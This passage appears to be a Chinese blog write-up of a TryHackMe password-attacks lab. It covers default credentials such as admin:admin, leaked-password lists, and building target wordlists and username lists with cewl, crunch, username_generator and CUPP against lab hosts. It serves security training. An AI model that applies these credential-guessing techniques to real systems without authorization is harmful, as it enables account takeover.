class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-password攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-14T10:10:44.000Z" title="发表于 2024-07-14 18:10:44">2024-07-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:31.221Z" title="更新于 2024-08-01 16:12:31">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-password攻击"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/14/thm-password-gong-ji/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/14/thm-password-gong-ji/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-password攻击</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-14T10:10:44.000Z" title="发表于 2024-07-14 18:10:44">2024-07-14</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:31.221Z" title="更新于 2024-08-01 16:12:31">2024-08-01</time></header><h1 id="0x01-介绍">0x01 介绍</h1>
<p>这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：</p>
<ul>
<li>Password profiling</li>
<li>Password attacks techniques</li>
<li>Online password attacks</li>
</ul>
<h2 id="什么是密码">什么是密码</h2>
<p>密码用作个人访问计算机系统或应用程序的身份验证方法。使用密码可确保帐户的所有者是唯一有权访问的人。但是，如果密码被共享或落入坏人之手，则可能会对给定系统进行未经授权的更改。未经授权的访问可能会导致系统整体状态和运行状况发生变化或损坏文件系统。密码通常由字母、数字和符号等字符的组合组成。因此，如何生成密码取决于用户！</p>
<p>密码的集合通常称为字典或单词列表。在各类公开披露的密码数据泄露事件中，常见的是复杂度低、容易被猜测的密码。例如，易于猜测的密码可以是密码、123456、111111 等等。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords">以下是最常见和最常见的密码供您参考</a>。因此，攻击者对目标或服务进行密码攻击来猜测密码不会花费很长时间，也很困难。选择强密码是一个很好的做法，这样就很难猜测或破解。强密码不应是常见单词或在字典中找到的密码，并且密码长度至少应为八个字符。它还应包含大写和小写字母、数字和符号字符串（例如：*&amp;^%$#@）。</p>
<p>有时，公司有自己的密码策略，并强制用户在创建密码时遵循准则。这有助于确保用户不在其组织内使用常见或弱密码，并可以限制暴力破解等攻击媒介。例如，密码长度必须为八个字符或更多，包括字符、一对数字和至少一个符号。然而，如果攻击者弄清楚了密码策略，他就可以生成满足帐户密码策略的密码列表。</p>
<h2 id="密码的安全性如何">密码的安全性如何</h2>
<p>密码是访问在线帐户或计算机系统的一种保护方法。密码认证方法用于访问个人和私人系统，其使用密码的主要目的是保证密码安全并且不与他人共享。</p>
<p>回答这个问题：密码的安全性如何？取决于各种因素。密码通常存储在文件系统或数据库中，保证它们的安全至关重要。我们见过一些公司将密码存储在明文文档中的案例，例如<a target="_blank" rel="noopener" href="https://www.techdirt.com/articles/20141204/12032329332/shocking-sony-learned-no-password-lessons-after-2011-psn-hack.shtml">2014年索尼的数据泄露事件</a>。因此，一旦攻击者访问文件系统，他就可以轻松获取并重复使用这些密码。另一方面，其他人使用散列函数或加密算法等各种技术在系统内存储密码，以使其更加安全。即使攻击者必须访问系统，破解起来也会更加困难。我们将在接下来的任务中介绍破解哈希值。</p>
<h1 id="0x02-密码攻击技术">0x02 密码攻击技术</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217805.png" alt="image-20240714182139668"></p>
<p>在这个房间里，我们将讨论可用于执行密码攻击的技术。我们将介绍各种技术，例如字典、暴力破解、规则库和猜测攻击。所有上述技术都被视为主动“在线”攻击，攻击者需要与目标计算机通信以获取密码，以便获得对计算机的未经授权的访问。</p>
<h2 id="密码破解与密码猜测">密码破解与密码猜测</h2>
<p>本节从网络安全角度讨论密码破解术语。此外，我们还将讨论密码破解和密码猜测之间的显着差异。最后，我们将演示用于密码破解的各种工具，包括 Hashcat 和 John the Ripper.</p>
<p>密码破解是一种用于从加密或散列数据到明文数据发现密码的技术。攻击者可能会从受感染的计算机获取加密或散列的密码，或者通过网络传输数据捕获它们。 一旦获得密码，攻击者就可以利用密码攻击技术，使用各种工具破解这些散列密码。</p>
<p>密码破解被认为是渗透测试的传统技术之一。主要目标是让攻击者升级到更高的权限并访问计算机系统或网络。密码猜测和密码破解是信息安全专业人员经常使用的方法。两者都有不同的含义和含义。密码猜测是一种基于字典猜测在线协议和服务密码的方法。 以下是密码破解和密码猜测之间的主要区别：</p>
<ul>
<li>密码猜测是一种用于针对在线协议和服务的技术。因此，它被认为是耗时的，并且提供了为失败的登录尝试生成日志的机会。在基于 Web 的系统上进行的密码猜测攻击通常需要每次尝试都发送一个新的请求，这很容易被检测到。如果系统设计和配置安全，可能会导致帐户被锁定。</li>
<li>密码破解是一种在本地或由攻击者控制的系统上执行的技术。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217807.png" alt="image-20240714182607566"></p>
<h1 id="0x03-密码分析-默认-弱-泄露-组合和用户名单词列表">0x03 密码分析- 默认、弱、泄露、组合和用户名单词列表</h1>
<p>拥有良好的单词表对于成功进行密码攻击至关重要。了解如何生成用户名列表和密码列表非常重要。在本节中，我们将讨论创建目标用户名和密码列表。我们还将涵盖各种主题，包括默认密码、弱密码、泄露密码以及创建目标单词列表。</p>
<h2 id="默认密码">默认密码</h2>
<p>在执行密码攻击之前，值得针对目标服务尝试几个默认密码。制造商为交换机、防火墙、路由器等产品和设备设置默认密码。在某些情况下，客户不更改默认密码，这会使系统容易受到攻击。因此，尝试一下 admin:admin、admin:123456 等是一个很好的做法。如果我们知道目标设备，我们可以查找默认密码并尝试它们。例如，假设目标服务器是 Tomcat，一个轻量级的开源 Java 应用程序服务器。 在这种情况下，我们可以尝试几个可能的默认密码：admin:admin 或 tomcat:admin</p>
<p>以下是一些提供各种产品默认密码的网站列表。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">https://cirt.net/passwords</a></li>
<li><a target="_blank" rel="noopener" href="https://default-password.info/">https://default-password.info/</a></li>
<li><a target="_blank" rel="noopener" href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li>
</ul>
<h2 id="弱密码">弱密码</h2>
<p>随着时间的推移，专业人士会收集并生成弱密码列表，并经常将它们组合成一个大的单词列表。列表是根据他们的经验以及他们在渗透测试中看到的内容生成的。这些列表还可能包含已公开发布的泄露密码。以下是一些常见的弱密码列表：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://wiki.skullsecurity.org/index.php?title=Passwords">https://wiki.skullsecurity.org/index.php?title=Passwords</a> - 这包括最著名的密码集合。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a> - 各种列表的巨大集合，不仅用于密码破解。</li>
</ul>
<h2 id="密码泄露">密码泄露</h2>
<p>密码或哈希值等敏感数据可能会因违规而被公开披露或出售。这些公共或私人可用的泄漏通常被称为“转储”。根据转储的内容，攻击者可能需要从数据中提取密码。在某些情况下，转储可能只包含密码的哈希值，需要破解才能获得纯文本密码。以下是一些常见的弱密码、泄露密码列表，包括webhost、elitehacker、hak5、Hotmail、PhpBB公司的泄露：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases">SecLists/密码/泄露数据库</a></li>
</ul>
<h2 id="组合词表">组合词表</h2>
<p>假设我们有多个单词表。然后，我们可以将这些单词列表合并成一个大文件。可以使用 cat 按如下方式完成此操作:</p>
<pre><code class="hljs scss">cat file1<span class="hljs-selector-class">.txt</span> file2<span class="hljs-selector-class">.txt</span> file3<span class="hljs-selector-class">.txt</span> &gt; combined_list<span class="hljs-selector-class">.txt</span></code></pre>
<p>要清理生成的组合列表以删除重复的单词，我们可以使用 sort 和 uniq，如下所示：</p>
<pre><code class="hljs scss">sort combined_list<span class="hljs-selector-class">.txt</span> | uniq -u &gt; cleaned_combined_list<span class="hljs-selector-class">.txt</span></code></pre>
<h2 id="定制词汇表">定制词汇表</h2>
<p>自定义密码列表是增加找到有效凭据的机会的最佳方法之一。我们可以从目标网站创建自定义密码列表。通常，公司的网站包含有关公司及其员工的宝贵信息，包括电子邮件和员工姓名。此外，该网站可能包含特定于公司所提供产品的关键字，包括产品和服务名称，这些关键字可能会在员工的密码中使用！</p>
<p>Cewl 等工具可用于有效地抓取网站并提取字符串或关键字。 Cewl 是一个强大的工具，可以生成特定于给定公司或目标的单词列表。请考虑以下示例：</p>
<pre><code class="hljs scss">cewl -w list<span class="hljs-selector-class">.txt</span> -d <span class="hljs-number">5</span> -m <span class="hljs-number">5</span> http://thm.labs</code></pre>
<blockquote>
<p>-w 将把内容写入文件。在本例中为 list.txt。</p>
<p>-m 5 收集 5 个或更多字符的字符串（单词）</p>
<p>-d 5 是网络爬行/蜘蛛的深度级别（默认2）</p>
<p><a target="_blank" rel="noopener" href="http://thm.labs">http://thm.labs</a> 是将要使用的 URL</p>
</blockquote>
<p>因此，我们现在应该有一个基于特定企业的相关单词（例如名称、位置和许多商业术语）的适当大小的单词列表。同样，创建的单词列表可用于模糊用户名。</p>
<p>应用我们讨论的内容，使用 cewl 针对 <a target="_blank" rel="noopener" href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 来解析所有单词并生成最小长度为 8 的单词列表。请注意，我们稍后将在另一个任务中使用此单词列表！</p>
<h2 id="用户名单词列表">用户名单词列表</h2>
<p>在点查阶段收集员工姓名至关重要。我们可以从目标网站生成用户名列表。对于下面的示例，我们假设我们有一个 {first name} {last name} （例如：John Smith）和一个生成用户名的方法。</p>
<ul>
<li><strong>{first name}:</strong> john</li>
<li><strong>{last name}:</strong> smith</li>
<li>{first name}{last name}: johnsmith</li>
<li>{last name}{first name}: smithjohn</li>
<li>first letter of the <strong>{first name}{last name}: *<em>jsmith*</em></strong><br>
{名字}{姓氏}的第一个字母：jsmith</li>
<li>first letter of the <strong>{last name}{first name}: *<em>sjohn*</em></strong><br>
{姓氏}{名字}的第一个字母：sjohn</li>
<li>first letter of the <strong>{first name}.{last name}: *<em>j.smith*</em></strong><br>
{名字}.{姓氏}的第一个字母：j.smith</li>
<li>first letter of the <strong>{first name}-{last name}: *<em>j-smith*</em></strong><br>
{名字}-{姓氏}的第一个字母：j-smith</li>
<li>and so on</li>
</ul>
<p>值得庆幸的是，如果我们有名字和姓氏，有一个工具 username_generator 可以帮助创建包含大多数可能组合的列表。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$ git clone <span class="hljs-attribute">https</span>://github.com/therodri2/username_generator.git
Cloning into <span class="hljs-string">'username_generator'</span>...
<span class="hljs-attribute">remote</span>: Enumerating <span class="hljs-attribute">objects</span>: <span class="hljs-number">9</span>, done.
<span class="hljs-attribute">remote</span>: Counting <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">9</span>/<span class="hljs-number">9</span>), done.
<span class="hljs-attribute">remote</span>: Compressing <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">7</span>/<span class="hljs-number">7</span>), done.
<span class="hljs-attribute">remote</span>: Total <span class="hljs-number">9</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">0</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">0</span>
Receiving <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">9</span>/<span class="hljs-number">9</span>), done.

user<span class="hljs-keyword">@thm</span>$ cd username_generator</code></pre>
<p>使用 python3 username_generator.py -h 显示该工具的帮助消息和可选参数。</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
└─$ python username_generator<span class="hljs-selector-class">.py</span> -h                                                                                                                                         
usage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

options:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default</code></pre>
<p>现在让我们创建一个包含全名 John Smith 的单词列表到文本文件中。然后，我们将运行该工具来生成给定全名的可能组合。</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
└─$ python username_generator<span class="hljs-selector-class">.py</span> -w users<span class="hljs-selector-class">.lst</span> 
john
smith
j<span class="hljs-selector-class">.smith</span>
j-smith
j_smith
j+smith
jsmith
johnsmith
smithjohn
john<span class="hljs-selector-class">.smith</span>
smith<span class="hljs-selector-class">.john</span></code></pre>
<p>这只是自定义用户名生成器的一个示例。请随意探索更多选项，甚至用您选择的编程语言创建自己的选项！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217808.png" alt="image-20240714185004892"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217809.png" alt="image-20240714185010946"></p>
<h1 id="0x04-密码分析-密钥空间技术和-cupp">0x04 密码分析- 密钥空间技术和 CUPP</h1>
<h2 id="keyspace技术">Keyspace技术</h2>
<p>准备单词列表的另一种方法是使用键空间技术。在这种技术中，我们在单词列表中指定一系列字符、数字和符号。 crunch 是用于创建离线单词列表的众多强大工具之一。通过 crunch，我们可以指定许多选项，包括 min、max 和选项，如下所示：</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
└─$ crunch -h                                                                                                                                                               
crunch version <span class="hljs-number">3.6</span>

Crunch can create <span class="hljs-selector-tag">a</span> wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch &lt;min&gt; &lt;max&gt; [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.</code></pre>
<p>以下示例创建一个包含 2 个字符的所有可能组合（包括 0-4 和 a-d）的单词列表。我们可以使用 -o 参数并指定一个文件来保存输出。</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/username_generator]</span>
└─$ crunch <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">01234</span>abcd -o crunch<span class="hljs-selector-class">.txt</span>
Crunch will now generate the following amount of data: <span class="hljs-number">243</span> bytes
<span class="hljs-number">0</span> MB
<span class="hljs-number">0</span> GB
<span class="hljs-number">0</span> TB
<span class="hljs-number">0</span> PB
Crunch will now generate the following number of lines: <span class="hljs-number">81</span> 

crunch: <span class="hljs-number">100%</span> completed generating output</code></pre>
<p>这是输出的片段：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217810.png" alt="image-20240714190413416"></p>
<p>值得注意的是，crunch 可以生成非常大的文本文件，具体取决于您指定的字长和组合选项。以下命令创建一个最小和最大长度为 8 个字符的列表，其中包含数字 0-9、a-f 小写字母和 A-F 大写字母：</p>
<p>crunch 8 8 0123456789abcdefABCDEF -o crunch.txt 生成的文件大小为 459 GB，包含 54875873536 个单词。</p>
<p>crunch 还允许我们使用 -t 选项指定字符集来组合我们选择的单词。以下是一些其他选项，可用于帮助您创建不同的选择组合：</p>
<blockquote>
<p>@ - 小写字母字符<br>
, - 大写字母字符<br>
% - 数字字符<br>
^ - 特殊字符，包括空格</p>
</blockquote>
<p>例如，如果我们知道密码的一部分，并且我们知道它以 pass 开头并跟随两个数字，则我们可以使用上面的 % 符号来匹配数字。这里我们生成一个单词列表，其中包含 pass 后跟 2 个数字：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  crunch <span class="hljs-number">6</span> <span class="hljs-number">6</span> -t pass%%
Crunch will now generate the following amount of <span class="hljs-attribute">data</span>: <span class="hljs-number">700</span> bytes
<span class="hljs-number">0</span> MB
<span class="hljs-number">0</span> GB
<span class="hljs-number">0</span> TB
<span class="hljs-number">0</span> PB
Crunch will now generate the following number of <span class="hljs-attribute">lines</span>: <span class="hljs-number">100</span>
pass00
pass01
pass02
pass03</code></pre>
<h2 id="cupp-常用用户密码分析器">CUPP - 常用用户密码分析器</h2>
<p>CUPP 是一个用 Python 编写的自动交互式工具，用于创建自定义单词列表。例如，如果您知道特定目标的一些详细信息，例如生日、宠物名、公司名称等，那么这可能是一个有用的工具，可以根据这些已知信息生成密码。 CUPP 将获取所提供的信息并根据所提供的信息生成自定义单词列表。还支持 1337/leet 模式，该模式用数字替换字母 a、i、e、t、o、s、g、z。例如，将 a 替换为 4 或将 i 替换为 1。有关该工具的更多信息，<a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp">请访问此处的 GitHub 存储库</a>。</p>
